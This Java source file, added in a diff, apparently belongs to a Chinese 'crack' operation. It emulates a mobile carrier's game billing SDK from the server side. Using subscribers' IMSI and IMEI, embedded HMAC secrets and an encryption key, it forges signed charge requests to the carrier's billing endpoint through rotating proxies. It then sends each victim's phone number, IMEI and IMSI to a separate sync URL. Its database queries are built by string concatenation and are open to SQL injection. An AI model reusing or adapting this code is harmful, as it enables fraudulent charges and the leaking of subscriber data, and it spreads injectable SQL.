@@ -1,0 +1,838 @@
+package com.astrolink.dao;
+
+import java.io.UnsupportedEncodingException;
+import java.net.URLEncoder;
+import java.sql.ResultSetMetaData;
+import java.sql.SQLException;
+
+import net.sf.json.JSONArray;
+import net.sf.json.JSONObject;
+
+import org.apache.commons.httpclient.params.HttpMethodParams;
+import org.apache.log4j.Logger;
+
+import com.astrolink.consts.Const;
+import com.astrolink.domain.DmExecLog;
+import com.astrolink.logic.listener.JobThread;
+import com.astrolink.service.IExecFinish;
+import com.astrolink.util.tools.BasicsTools;
+import com.astrolink.util.tools.DbTools;
+import com.astrolink.util.tools.ExceptionTool;
+import com.astrolink.util.tools.ExceptionTools;
+import com.astrolink.util.tools.GetNetWork;
+import com.astrolink.util.tools.JsonTools;
+import com.astrolink.util.tools.PostNetWork;
+import com.astrolink.util.tools.business.DmTools;
+import com.sun.rowset.CachedRowSetImpl;
+
+
+/**
+ * 发送短信线程
+ * @author cuilei
+ * @date 2015-11-30
+ */
+public class DmSmsExecLinstenerThreadDao extends JobThread{
+	private Logger logger = Logger.getLogger(DmSmsExecLinstenerThreadDao.class);
+	private String dbTableName;
+	public DmExecLog dmExecLog;
+	public IExecFinish execFinish;
+	private byte[] Key1;
+	private byte[] Key2; 
+	private DmTools dmTools=new DmTools();
+	private int connectionTimeout=Integer.parseInt(Const.COMIC_connectionTimeout); 
+	private int soTimeout=Integer.parseInt(Const.COMIC_soTimeout); 
+	
+	public DmSmsExecLinstenerThreadDao(DmExecLog dmExecLog){
+		this.dmExecLog = dmExecLog;
+	}
+	
+	public void setExecFinish(IExecFinish execFinish) {
+		this.execFinish = execFinish;
+	}
+	 
+	public void setDbTableName(String dbTableName) {
+		this.dbTableName = dbTableName;
+	}
+
+	@Override
+	public void exec() {
+		if(execType(dmExecLog.getId(),dmExecLog.getMethodType())){
+			logger.info("开始动漫计费确认，id为" + this.getKey());
+			int payStepNum=0;
+			String status ="-1";
+			String message ="";
+			String phoneNumber ="0";
+			String en_session ="";
+			String chid="";
+			String mchid="";
+			try {
+				String apkstatus = "b";// 固定 也可解密网络请求进行确认
+				String sdksessionid = BasicsTools.getUuid(true,16,Const.random);// 16位随机数（大小写+数字）
+				String itemExt = "";
+				
+				String SubscriberId="",DeviceId="",appid="",cpparam="",encodeCID="",rand16Num="",TimeStamp="";
+				String ctype="",contentId="",cpid="";
+				String itemId="",itemPrice="",itemSafeLevel="",itemMethod="";
+				
+				boolean type=false;
+				try {
+					SubscriberId = dmExecLog.getImsi();//"460029316856837";
+					DeviceId = dmExecLog.getImei();//"861007020172600";
+					appid = dmExecLog.getAppid();//"00003392";
+					Key1 = dmTools.hexString2Bytes(dmExecLog.getKey1());
+					Key2 = dmTools.hexString2Bytes(dmExecLog.getKey2());
+					cpparam = dmExecLog.getCpparam();//"123456";
+					encodeCID = dmExecLog.getEncodeCID();//"g/+rxzyWTe398J8Knokq+Q==";
+					rand16Num = dmExecLog.getRand16Num();//"ToCeujY6Iw5NatHL";
+					TimeStamp = dmExecLog.getTimeStamp();//"20160108161933";
+					
+					JSONObject json=JsonTools.getJsonData(dmExecLog.getConfigInfo());
+					JSONObject content=json.getJSONObject("content");
+					ctype = content.getString("ctype");//4;
+					contentId = content.getString("contentId");//"300000007033";
+					chid = content.getString("channelId");//"800001654";子渠道
+					mchid = content.optString("mainChannelId");//"800001654";同步都是的渠道id，有主渠道就用主渠道否则用子渠道
+					cpid = content.getString("cpId");//"101808";
+					
+					JSONObject item=getItemInfo(content.getJSONObject("itemList").getJSONArray("item"),dmExecLog.getConsumeCode());
+					
+					itemId = item.getString("itemId");//"300007033002";
+					itemPrice = item.getString("itemPrice");//"300";
+					itemSafeLevel = item.getString("itemSafeLevel");//"2";
+					itemMethod = item.getString("itemMethod");//"11";
+					type=true;
+				} catch (Exception e) {
+					type=false;
+					logger.error(ExceptionTools.exception(e));
+				}
+				
+				if(type){
+					String transId = dmTools.gettransId();
+					itemMethod = dmTools.getitemMethod(itemMethod);
+					
+					String requestTime = dmTools.getRequestTime();
+					String enreq1 = generate_enreq1(ctype, appid, SubscriberId, DeviceId, encodeCID, rand16Num, TimeStamp, cpid, contentId, chid, sdksessionid, apkstatus, requestTime, cpparam);
+					String req1singature = dmTools.getHmacSHA1("+15BFidS}7/+POST+en_sessionreq=" + enreq1 + "&apiVersion=1.0&SDKVersion=12001000", "15BFidS}7/&");
+					post_getSession1(SubscriberId, DeviceId, req1singature, enreq1);
+		
+					requestTime = dmTools.getRequestTime();
+					String enreq2 = generate_enreq2(ctype, appid, SubscriberId, DeviceId, encodeCID, rand16Num, TimeStamp, cpid, contentId, chid, sdksessionid, apkstatus, requestTime, cpparam);
+					String req2singature = dmTools.getHmacSHA1("+15BFidS}7/+POST+en_sessionreq=" + enreq2 + "&apiVersion=1.0&SDKVersion=12001000", "15BFidS}7/&");
+					String sessionrep = String.valueOf(post_getSession2(SubscriberId, DeviceId, req2singature, enreq2));
+					
+					payStepNum=payStepNum+1;
+					status = dmTools.getContextByTag(sessionrep, "status");
+					message = dmTools.getContextByTag(sessionrep, "message");
+					en_session = dmTools.getContextByTag(sessionrep, "en_session");
+					
+					if (!en_session.equals("") && !en_session.equals("-1")){
+						status="200001";
+						message ="计费失败";
+						
+						String de_session = dmTools.decode_RequestResponse(rand16Num, en_session);
+						String session = dmTools.getContextByTag(de_session, "session");
+						String msisdn = dmTools.getContextByTag(de_session, "msisdn");//手机号
+						payStepNum=payStepNum+1;
+						
+						int infoCode=logicLimit(msisdn ,SubscriberId,dmExecLog.getConsumeCode() ,dmExecLog.getCpid(),dmExecLog.getSpProductConsumeCodeId()+"");
+						if(infoCode==0 || infoCode==1000001){
+							requestTime = dmTools.getRequestTime();
+							String enreq3 = generate_enreq3(ctype, appid, SubscriberId, DeviceId, encodeCID, rand16Num, TimeStamp, cpid, contentId, chid, sdksessionid, apkstatus, requestTime, session, transId, itemId, itemPrice, itemSafeLevel, itemMethod, itemExt, cpparam);
+							String req3singature = dmTools.getHmacSHA1("+15BFidS}7/+POST+ctype=" + ctype + "&en_billingreq=" + enreq3 + "&transId=" + transId + "&apiVersion=1.0&SDKVersion=12001000", "15BFidS}7/&");
+							String chargerep = String.valueOf(post_doCharge(SubscriberId, DeviceId, req3singature, enreq3, ctype, transId));
+							
+							status = dmTools.getContextByTag(chargerep, "status");
+							message = dmTools.getContextByTag(chargerep, "message");
+							phoneNumber = dmTools.getContextByTag(chargerep, "phoneNumber");
+						}else{
+							dmExecLog.setInfoCode(infoCode+"");
+							phoneNumber = msisdn;
+						}
+					}
+					//String doChargeReturnExt = dmTools.getContextByTag(chargerep, "returnExt");
+					//System.out.println(new String(Base64.decodeBase64(doChargeReturnExt.replaceAll("-", "+").replaceAll("_", "/").getBytes())));
+				}
+			} catch (Exception e) {
+				logger.error(ExceptionTools.exception(e));
+			}finally{
+				try {
+					//System.out.println("payStepNum:"+payStepNum);
+					//System.out.println("status:"+status);
+					//System.out.println("message:"+message);
+					//System.out.println(dmExecLog.getCrackSynUrl());
+					try {
+						status=Integer.parseInt(status)+"";
+					} catch (Exception e2) {
+						status="-1";
+					}
+					
+					if(dmExecLog.getInfoCode().equals("0") || dmExecLog.getInfoCode().equals("1000001")){
+						if(payStepNum==2 && Integer.parseInt(status)==0){
+							updataExecLog(dmExecLog.getId());
+							sevePayResultLog(payStepNum,status,message,phoneNumber,dmExecLog.getCrackSynUrl(),en_session,dmExecLog.getId(),dmExecLog.getProxyIp(),chid,mchid);
+						}else{
+							int num=0;
+							if(dmExecLog.getMethodType()<100){
+								num=Const.COMIC_LOGIC_RETRY_NUM;
+							}else{
+								num=Const.COMIC_LOGIC_RETRY_NUM_SK;
+							}
+							if(dmExecLog.getExecNum()<num-1){
+								updateExecNum(dmExecLog.getId());
+							}else{
+								updataExecLog(dmExecLog.getId());
+								sevePayResultLog(payStepNum,status,message,phoneNumber,dmExecLog.getCrackSynUrl(),en_session,dmExecLog.getId(),dmExecLog.getProxyIp(),chid,mchid);
+							}
+						}
+					}else{
+						updataExecLog(dmExecLog.getId());
+						sevePayResultLog(payStepNum,status,message,phoneNumber,dmExecLog.getCrackSynUrl(),en_session,dmExecLog.getId(),dmExecLog.getProxyIp(),chid,mchid);
+					}
+					
+				} catch (Exception e) {
+					logger.info("处理请求失败，id为" + this.getKey() + ExceptionTools.exception(e));
+				} finally{
+					if (execFinish != null) {
+						execFinish.execDone(this.getKey());
+						logger.info("处理请求结束，id为" + this.getKey());
+					}
+				}
+			}
+		}else{
+			if (execFinish != null) {
+				execFinish.execDone(this.getKey());
+				logger.info("处理请求结束，id为" + this.getKey());
+			}
+		}
+	}
+	private boolean execType(long id,int methodType){
+		try {
+			if(methodType<100){
+				DbTools dt=new  DbTools(Const.DB_COMIC_URL,Const.DB_MYSQL_DRIVER,Const.DB_COMIC_USERNAME,Const.DB_COMIC_PASSWORD);
+				String sql="SELECT NOW(),MAX(inputDate),IFNULL((UNIX_TIMESTAMP(NOW()) - UNIX_TIMESTAMP(MAX(inputDate))),9999) AS num FROM pay_result_log WHERE imsi='"+dmExecLog.getImsi()+"' AND dayTime=DATE_FORMAT(NOW(),'%Y-%m-%d')";
+				CachedRowSetImpl crsi=dt.executeQuery(sql,DmSmsDataLinstenerThreadDao.class);
+				while (crsi.next()) {
+					if(crsi.getInt("num")>=10){
+						return true;
+					}else{
+						StringBuffer sqlBuff=new StringBuffer();
+						sqlBuff.append("UPDATE ").append(dbTableName).append(" SET  updateDate=DATE_ADD(updateDate,INTERVAL 10 second)").append("  WHERE `id` = '").append(id).append("' ");
+						DbTools dtu=new  DbTools(Const.DB_COMIC_URL,Const.DB_MYSQL_DRIVER,Const.DB_COMIC_USERNAME,Const.DB_COMIC_PASSWORD);
+						logger.info("execType：" + dtu.upDate(sqlBuff.toString(), DmSmsExecLinstenerThreadDao.class));
+						return false;
+					}
+				}
+			}else{
+				return true;
+			}
+		} catch (Exception e) {
+			logger.error(ExceptionTools.exception(e));
+			return true;
+		}
+		return true;
+	}
+	
+	public  void updateExecNum(long id){
+		StringBuffer sqlBuff=new StringBuffer();
+		sqlBuff.append("UPDATE ").append(dbTableName).append(" SET  execNum = execNum+1, updateDate='").append(BasicsTools.getForDate("yyyy-MM-dd HH:mm:ss")).append("'  WHERE `id` = '").append(id).append("' ");
+		DbTools dt=new  DbTools(Const.DB_COMIC_URL,Const.DB_MYSQL_DRIVER,Const.DB_COMIC_USERNAME,Const.DB_COMIC_PASSWORD);
+		logger.info("updateExecNum：" + dt.upDate(sqlBuff.toString(), DmSmsExecLinstenerThreadDao.class));
+	}
+	
+	public  void deleteExecLog(long id){
+		StringBuffer sqlBuff=new StringBuffer();
+		sqlBuff.append("DELETE FROM ").append(dbTableName).append(" WHERE `id` = '").append(id).append("' ");
+		DbTools dt=new  DbTools(Const.DB_COMIC_URL,Const.DB_MYSQL_DRIVER,Const.DB_COMIC_USERNAME,Const.DB_COMIC_PASSWORD);
+		logger.info("deleteExecLog：" + dt.upDate(sqlBuff.toString(), DmSmsExecLinstenerThreadDao.class));
+	}
+	
+	public  void updataExecLog(long id){
+		StringBuffer sqlBuff=new StringBuffer();
+		//sqlBuff.append("UPDATE comic.exec_log SET deleteType = '1' WHERE id= '").append(id).append("'");
+		sqlBuff.append("DELETE FROM comic.exec_log WHERE id = '").append(id).append("'");
+		DbTools dt=new  DbTools(Const.DB_COMIC_URL,Const.DB_MYSQL_DRIVER,Const.DB_COMIC_USERNAME,Const.DB_COMIC_PASSWORD);
+		logger.info("deleteExecLog：" + dt.upDate(sqlBuff.toString(), DmSmsExecLinstenerThreadDao.class));
+	}
+	
+	public void sevePayResultLog(int payStepNum,String status,String message,String phoneNumber,String crackSynUrl,String en_session,long execLogId,String proxyIp,String chid,String mchid){
+		JSONObject dataInfo=new JSONObject();
+		dataInfo.put("payStepNum", payStepNum);
+		dataInfo.put("execLogId", execLogId);
+		dataInfo.put("status", status);
+		dataInfo.put("message", message);
+		dataInfo.put("en_session", en_session);
+		dataInfo.put("imei", dmExecLog.getImei());
+		dataInfo.put("imsi", dmExecLog.getImsi());
+		dataInfo.put("monum", dmExecLog.getMonum());
+		dataInfo.put("consumeCode", dmExecLog.getConsumeCode());
+		dataInfo.put("cpparam", dmExecLog.getCpparam());
+		dataInfo.put("execNum", dmExecLog.getExecNum());
+		dataInfo.put("phoneNumber", phoneNumber);
+		dataInfo.put("cpInfoId", dmExecLog.getCpid());
+		dataInfo.put("transId", dmExecLog.getRand16Num()+dmExecLog.getTimeStamp());
+		dataInfo.put("dayTime", BasicsTools.getForDate("yyyy-MM-dd"));
+		dataInfo.put("inputDate", BasicsTools.getForDate("yyyy-MM-dd HH:mm:ss"));	
+		dataInfo.put("methodType", dmExecLog.getMethodType());
+		if(!mchid.equals("")){
+			dataInfo.put("channelId", mchid);
+		}else{
+			dataInfo.put("channelId", chid);
+		}
+	
+		dataInfo.put("infoCode", dmExecLog.getInfoCode());
+		dataInfo.put("spProductConsumeCodeId", dmExecLog.getSpProductConsumeCodeId());
+		if(String.valueOf(dmExecLog.getProxyIp()).equals("") || String.valueOf(dmExecLog.getProxyIp()).equals("null")){
+			dataInfo.put("proxyIp", "");
+		}else{
+			dataInfo.put("proxyIp", proxyIp);
+		}
+		
+
+		try {
+			//crackSynUrl(dataInfo,crackSynUrl);
+			crackSyn(dataInfo,crackSynUrl(dataInfo,crackSynUrl));
+		} catch (Exception e) {
+			logger.error(ExceptionTools.exception(e));
+		}
+		
+		DbTools dt=new  DbTools(Const.DB_COMIC_URL,Const.DB_MYSQL_DRIVER,Const.DB_COMIC_USERNAME,Const.DB_COMIC_PASSWORD);
+		logger.info("sevePayResultLog：" + dt.insertJson(Const.COMIC_TABLE_PAY_RESULT_LOG, dataInfo, DmSmsExecLinstenerThreadDao.class));
+	}
+	
+	public void crackSyn(JSONObject dataInfo,String url){
+		GetNetWork get=new GetNetWork(url);
+		get.executeMethod();
+		dataInfo.put("synUrl", url);
+		dataInfo.put("synstatus", get.getNetState());
+		dataInfo.put("synresult", get.getString().replaceAll("'",""));
+	}
+	
+	public String crackSynUrl(JSONObject dataInfo,String crackSynUrl){
+		StringBuffer sbuff =new StringBuffer();
+		sbuff.append(crackSynUrl);
+		sbuff.append("?").append("mobile=").append(dataInfo.optString("phoneNumber"));
+		sbuff.append("&").append("cpid=").append(dataInfo.optString("cpInfoId"));
+		sbuff.append("&").append("cpparam=").append(dataInfo.optString("cpparam"));
+		sbuff.append("&").append("monum=").append(dataInfo.optString("monum"));
+		sbuff.append("&").append("sid=").append(dataInfo.optString("consumeCode"));
+		sbuff.append("&").append("imei=").append(dataInfo.optString("imei"));
+		sbuff.append("&").append("imsi=").append(dataInfo.optString("imsi"));
+		sbuff.append("&").append("linkId=").append(dataInfo.optString("transId"));
+		sbuff.append("&").append("status=").append(dataInfo.optString("status"));
+		sbuff.append("&").append("chid=").append(dataInfo.optString("channelId"));
+		sbuff.append("&").append("spProductConsumeCodeId=").append(dataInfo.optString("spProductConsumeCodeId"));
+		try {
+			sbuff.append("&").append("message=").append(URLEncoder.encode(dataInfo.optString("message"),"utf-8"));
+		} catch (UnsupportedEncodingException e) {
+			e.printStackTrace();
+		}
+		return sbuff.toString();
+		/*
+		 * 		 
+		JSONObject jo=new JSONObject();
+		jo.put("mobile", dataInfo.optLong("phoneNumber"));					
+		jo.put("consumeCode", dataInfo.optString("consumeCode"));
+		jo.put("pseudoCode", dataInfo.optString("pseudoCode"));			
+		jo.put("monum", dataInfo.optString("monum"));	
+		jo.put("pseudoNum", dataInfo.optString("pseudoNum"));
+		jo.put("linkId", dataInfo.optString("transId"));					
+		jo.put("imei", dataInfo.optString("imei"));					
+		jo.put("imsi", dataInfo.optString("imsi"));					
+		jo.put("cpInfoId", dataInfo.optString("cpInfoId"));				
+		jo.put("cpParam", dataInfo.optString("cpparam"));				
+		jo.put("message", dataInfo.optString("message"));
+		jo.put("myCode", "zjsypj");
+		jo.put("channelCode", "0");	
+		jo.put("opType", "0");	
+		price
+		STATUS
+		dayTime
+		inputDate
+		
+		boolean provType=false;
+		try {
+			if(dataInfo.optString("phoneNumber").length()>=7){
+				DbTools dt=new  DbTools(Const.DB_SPINFO_URL,Const.DB_MYSQL_DRIVER,Const.DB_SPINFO_USERNAME,Const.DB_SPINFO_PASSWORD);
+				String sql="SELECT provCode,cityCode FROM mob_city WHERE mob7='"+dataInfo.optString("phoneNumber").substring(0,7)+"'";
+				CachedRowSetImpl cesi =dt.executeQuery(sql, DmSmsExecLinstenerThreadDao.class);
+				if(cesi.next()) {
+					String provCode = cesi.getString("provCode");
+					String cityCode	= cesi.getString("cityCode");
+					jo.put("prov_ID", provCode);
+					jo.put("city_ID", cityCode);
+				}else{
+					provType=true;
+				}
+			}else{
+				provType=true;
+			}
+		} catch (Exception e) {
+			provType=true;
+			e.printStackTrace();
+		} finally{
+			if(provType){
+				jo.put("prov_ID", "-1");
+				jo.put("city_ID", "-1");
+			}
+		}
+		DbTools dt=new  DbTools(Const.DB_SPINFO_URL,Const.DB_MYSQL_DRIVER,Const.DB_SPINFO_USERNAME,Const.DB_SPINFO_PASSWORD);
+		dt.insertJson("syn_spincome", jo, DmSmsExecLinstenerThreadDao.class);
+		*/
+		
+	}
+	
+	public JSONObject getItemInfo(JSONArray item,String consumeCode){
+		for(int i=0;i<item.size();i++){
+			JSONObject json=item.getJSONObject(i);
+			if(json.getString("itemId").equals(consumeCode)){
+				return json;
+			}
+		}
+		return null;
+	}
+	
+	public  String generate_enreq1(String ctype, String appid, String SubscriberId, String DeviceId, String encodeCID, String rand16Num, String TimeStamp, String cpid, String contentId, String chid, String sdksessionid, String apkstatus, String requestTime, String cpparam) {
+		String result = "<?xml version=\'1.0\' encoding=\'UTF-8\' standalone=\'yes\' ?>" + "<charge_request>" + "<sdkversion>" + "12001000" + "</sdkversion>" + "<type>" + ctype + "</type>" + "<requesttype>1</requesttype>" + "<cpid>" + cpid + "</cpid>" + "<cid>" + contentId + "</cid>" + "<chid>" + chid + "</chid>" + "<imsi>" + SubscriberId + "</imsi>" + "<imei>" + DeviceId + "</imei>" + "<sdksessionid>" + sdksessionid + "</sdksessionid>" + "<apkstatus>" + apkstatus + "</apkstatus>" + "<requestTime>" + requestTime + "</requestTime>" + "<cpparam>" + cpparam + "</cpparam>" + "</charge_request>" + appid + DeviceId + SubscriberId + encodeCID + rand16Num + TimeStamp + apkstatus
+				+ "000100000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
+		String hex = dmTools.byte2hexString(result.getBytes());
+		result += dmTools.generateSingnature(hex,Key1,Key2);
+		//System.out.println(result);
+		result = dmTools.byte2hexString(result.getBytes());
+		result = dmTools.encode_RequestResponse("aZ8RyZRWxcJno2cBcwQDAHYjmZoOC5Gi", result);
+		// result = "en_sessionreq=" + URLEncoder.encode(result);
+		return result;
+	}
+
+	public  String generate_enreq2(String ctype, String appid, String SubscriberId, String DeviceId, String encodeCID, String rand16Num, String TimeStamp, String cpid, String contentId, String chid, String sdksessionid, String apkstatus, String requestTime, String cpparam) {
+		String result = "<?xml version=\'1.0\' encoding=\'UTF-8\' standalone=\'yes\' ?>" + "<charge_request>" + "<sdkversion>" + "12001000" + "</sdkversion>" + "<type>" + ctype + "</type>" + "<requesttype>2</requesttype>" + "<cpid>" + cpid + "</cpid>" + "<cid>" + contentId + "</cid>" + "<chid>" + chid + "</chid>" + "<imsi>" + SubscriberId + "</imsi>" + "<imei>" + DeviceId + "</imei>" + "<sdksessionid>" + sdksessionid + "</sdksessionid>" + "<apkstatus>" + apkstatus + "</apkstatus>" + "<requestTime>" + requestTime + "</requestTime>" + "<cpparam>" + cpparam + "</cpparam>" + "</charge_request>" + appid + DeviceId + SubscriberId + encodeCID + rand16Num + TimeStamp + apkstatus
+				+ "000200000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
+		String hex = dmTools.byte2hexString(result.getBytes());
+		result += dmTools.generateSingnature(hex,Key1,Key2);
+		//System.out.println(result);
+		result = dmTools.byte2hexString(result.getBytes());
+		result = dmTools.encode_RequestResponse("aZ8RyZRWxcJno2cBcwQDAHYjmZoOC5Gi", result);
+		// result = "en_sessionreq=" + URLEncoder.encode(result);
+		return result;
+	}
+
+	public  String generate_enreq3(String ctype, String appid, String SubscriberId, String DeviceId, String encodeCID, String rand16Num, String TimeStamp, String cpid, String contentId, String chid, String sdksessionid, String apkstatus, String requestTime, String session, String transId, String itemId, String itemPrice, String itemSafeLevel, String itemMethod, String itemExt, String cpparam) {
+		String result = "<?xml version=\'1.0\' encoding=\'UTF-8\' standalone=\'yes\' ?>" + "<charge_request>" + "<sdkversion>" + "12001000" + "</sdkversion>" + "<type>" + ctype + "</type>" + "<cpid>" + cpid + "</cpid>" + "<cid>" + contentId + "</cid>" + "<chid>" + chid + "</chid>" + "<imsi>" + SubscriberId + "</imsi>" + "<imei>" + DeviceId + "</imei>" + "<sdksessionid>" + sdksessionid + "</sdksessionid>" + "<apkstatus>" + apkstatus + "</apkstatus>" + "<transId>" + transId + "</transId>" + "<phoneNumber></phoneNumber>" + "<requestTime>" + requestTime + "</requestTime>" + "<cpparam>" + cpparam + "</cpparam><vcode></vcode><graphtransid></graphtransid><graphcode></graphcode>" + "<item>" + "<itemId>" + itemId + "</itemId>" + "<itemPrice>" + itemPrice + "</itemPrice>" + "<itemSafeLevel>"
+				+ itemSafeLevel + "</itemSafeLevel>" + "<itemMethod>" + itemMethod + "</itemMethod>" + "<itemExt>" + itemExt + "</itemExt>" + "</item>" + "</charge_request>" + appid + session + "000000" + DeviceId + SubscriberId + encodeCID + rand16Num + TimeStamp + apkstatus + "000200000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
+
+		String hex = dmTools.byte2hexString(result.getBytes());
+
+		result += dmTools.generateSingnature(hex,Key1,Key2);
+		//System.out.println(result);
+		result = dmTools.byte2hexString(result.getBytes());
+		result = dmTools.encode_RequestResponse("aZ8RyZRWxcJno2cBcwQDAHYjmZoOC5Gi", result);
+		// result = "en_billingreq=" + URLEncoder.encode(result);
+		// result += "&ctype=5&transId="+transId;
+		return result;
+	}
+	
+	public String post_doCharge(String SubscriberId, String DeviceId, String Signature, String enreq, String ctype, String transId) {
+		PostNetWork postNetWork =null;
+		String result = "";
+		try {
+			postNetWork = new PostNetWork("http://drm.cmgame.com:81/migusdk/charge/doCharge");
+			postNetWork.setConnectionTimeout(this.connectionTimeout);
+			postNetWork.setSoTimeout(this.soTimeout);
+			postNetWork.getPostMethod().addRequestHeader("Header-Signature", Signature);
+			postNetWork.getPostMethod().addRequestHeader("Header-Key", "&apiVersion=1.0&SDKVersion=12001000");
+			postNetWork.getPostMethod().addRequestHeader("Accept", "application/xml");
+			postNetWork.getPostMethod().addRequestHeader("Response-Type", "xml");
+			postNetWork.getPostMethod().addRequestHeader("platform", "Android");
+			postNetWork.getPostMethod().addRequestHeader("apiVersion", "1.0");
+			postNetWork.getPostMethod().addRequestHeader("SDKVersion", "12001000");
+			postNetWork.getPostMethod().addRequestHeader("imsi", SubscriberId);
+			postNetWork.getPostMethod().addRequestHeader("imei", DeviceId);
+			postNetWork.getPostMethod().addRequestHeader("X-OF-Signature", Signature);
+			postNetWork.getPostMethod().addRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+			postNetWork.getPostMethod().addRequestHeader("Host", "drm.cmgame.com:81");
+			postNetWork.getPostMethod().addRequestHeader("Connection", "Keep-Alive");
+			postNetWork.getPostMethod().addRequestHeader("Accept-Encoding", "gzip");
+			
+			postNetWork.setInfoInputStream("en_billingreq=" + URLEncoder.encode(enreq) + "&ctype=" + ctype + "&transId=" + transId);
+			//if(true){
+			if(String.valueOf(dmExecLog.getProxyIp()).equals("") || String.valueOf(dmExecLog.getProxyIp()).equals("null")){
+				postNetWork.executeMethod();
+				result = postNetWork.getString("UTF-8");
+			}else{
+				logger.info("ProxyIp..........................post_doCharge................."+dmExecLog.getProxyIp());
+				String[] Proxy =dmExecLog.getProxyIp().split(":");
+				postNetWork.setProxyHost(Proxy[0]);
+				postNetWork.setProxyPort(Integer.parseInt(Proxy[1]));
+				postNetWork.executeMethod(true);
+				result = postNetWork.getString("UTF-8","GZIP");
+			}
+			postNetWork.getNetState();
+		} catch (Exception e) {
+			logger.error(ExceptionTool.getErrorInfo(e));
+		} finally {
+			postNetWork.closeConn();
+		}
+		
+		/*String result = "";
+		PrintWriter out = null;
+		BufferedReader in = null;
+		try {
+			URL realUrl = new URL("http://drm.cmgame.com:81/migusdk/charge/doCharge");
+			URLConnection conn = realUrl.openConnection();
+			conn.setRequestProperty("Header-Signature", Signature);
+			conn.setRequestProperty("Header-Key", "&apiVersion=1.0&SDKVersion=12001000");
+			conn.setRequestProperty("Accept", "application/xml");
+			conn.setRequestProperty("Response-Type", "xml");
+			conn.setRequestProperty("platform", "Android");
+			conn.setRequestProperty("apiVersion", "1.0");
+			conn.setRequestProperty("SDKVersion", "12001000");
+			conn.setRequestProperty("imsi", SubscriberId);
+			conn.setRequestProperty("imei", DeviceId);
+			conn.setRequestProperty("X-OF-Signature", Signature);
+			conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+			conn.setRequestProperty("Host", "drm.cmgame.com:81");
+			conn.setRequestProperty("Connection", "Keep-Alive");
+			conn.setRequestProperty("Accept-Encoding", "gzip"); 
+			conn.setConnectTimeout(30000);
+			conn.setReadTimeout(30000);
+			//conn.setConnectTimeout(10000);
+			//conn.setReadTimeout(10000);
+			conn.setDoOutput(true);
+			conn.setDoInput(true);
+			out = new PrintWriter(conn.getOutputStream());
+			out.print("en_billingreq=" + URLEncoder.encode(enreq) + "&ctype=" + ctype + "&transId=" + transId);
+			out.flush();
+			in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+			String line;
+			while ((line = in.readLine()) != null) {
+				result += line;
+			}
+		} catch (Exception e) {
+			System.out.println("发送 POST 请求出现异常！" + e);
+			e.printStackTrace();
+		} finally {
+			try {
+				if (out != null) {
+					out.close();
+				}
+				if (in != null) {
+					in.close();
+				}
+			} catch (IOException ex) {
+				ex.printStackTrace();
+			}
+		}*/
+		System.out.println("doCharge:" + result);
+		System.out.println("doCharge:" + result);
+		System.out.println("doCharge:result:" + result);
+		return result;
+	}
+	
+	public String post_getSession1(String SubscriberId, String DeviceId, String Signature, String enreq) {
+		PostNetWork postNetWork =null;
+		String result = "";
+		try {
+			postNetWork = new PostNetWork("http://drm.cmgame.com:81/migusdk/charge/getSession");
+			postNetWork.setConnectionTimeout(this.connectionTimeout);
+			postNetWork.setSoTimeout(this.soTimeout);
+			postNetWork.getPostMethod().addRequestHeader("Header-Signature", Signature);
+			postNetWork.getPostMethod().addRequestHeader("Header-Key", "&apiVersion=1.0&SDKVersion=12001000");
+			postNetWork.getPostMethod().addRequestHeader("Accept", "application/xml");
+			postNetWork.getPostMethod().addRequestHeader("Response-Type", "xml");
+			postNetWork.getPostMethod().addRequestHeader("platform", "Android");
+			postNetWork.getPostMethod().addRequestHeader("apiVersion", "1.0");
+			postNetWork.getPostMethod().addRequestHeader("SDKVersion", "12001000");
+			postNetWork.getPostMethod().addRequestHeader("imsi", SubscriberId);
+			postNetWork.getPostMethod().addRequestHeader("imei", DeviceId);
+			postNetWork.getPostMethod().addRequestHeader("X-OF-Signature", Signature);
+			postNetWork.getPostMethod().addRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+			postNetWork.getPostMethod().addRequestHeader("Host", "drm.cmgame.com:81");
+			postNetWork.getPostMethod().addRequestHeader("Connection", "Keep-Alive");
+			postNetWork.getPostMethod().addRequestHeader("Accept-Encoding", "gzip");
+			postNetWork.getPostMethod().removeRequestHeader(HttpMethodParams.USER_AGENT);
+		
+			
+			postNetWork.setInfoInputStream("en_sessionreq=" + URLEncoder.encode(enreq));
+			//if(true){
+			if(String.valueOf(dmExecLog.getProxyIp()).equals("") || String.valueOf(dmExecLog.getProxyIp()).equals("null")){
+				postNetWork.executeMethod();
+				result = postNetWork.getString("UTF-8");
+			}else{
+				logger.info("ProxyIp..........................post_getSession1................."+dmExecLog.getProxyIp());
+				String[] Proxy =dmExecLog.getProxyIp().split(":");
+				postNetWork.setProxyHost(Proxy[0]);
+				postNetWork.setProxyPort(Integer.parseInt(Proxy[1]));
+				postNetWork.executeMethod(true);
+				result = postNetWork.getString("UTF-8","GZIP");
+			}
+			postNetWork.getNetState();
+		} catch (Exception e) {
+			logger.error(ExceptionTool.getErrorInfo(e));
+		} finally {
+			postNetWork.closeConn();
+		}
+		
+		
+		/*PrintWriter out = null;
+		BufferedReader in = null;
+		try {
+			URL realUrl = new URL("http://drm.cmgame.com:81/migusdk/charge/getSession");
+			URLConnection conn = realUrl.openConnection();
+			conn.setRequestProperty("Header-Signature", Signature);
+			conn.setRequestProperty("Header-Key", "&apiVersion=1.0&SDKVersion=12001000");
+			conn.setRequestProperty("Accept", "application/xml");
+			conn.setRequestProperty("Response-Type", "xml");
+			conn.setRequestProperty("platform", "Android");
+			conn.setRequestProperty("apiVersion", "1.0");
+			conn.setRequestProperty("SDKVersion", "12001000");
+			conn.setRequestProperty("imsi", SubscriberId);
+			conn.setRequestProperty("imei", DeviceId);
+			conn.setRequestProperty("X-OF-Signature", Signature);
+			conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+			conn.setRequestProperty("Host", "drm.cmgame.com:81");
+			conn.setRequestProperty("Connection", "Keep-Alive");
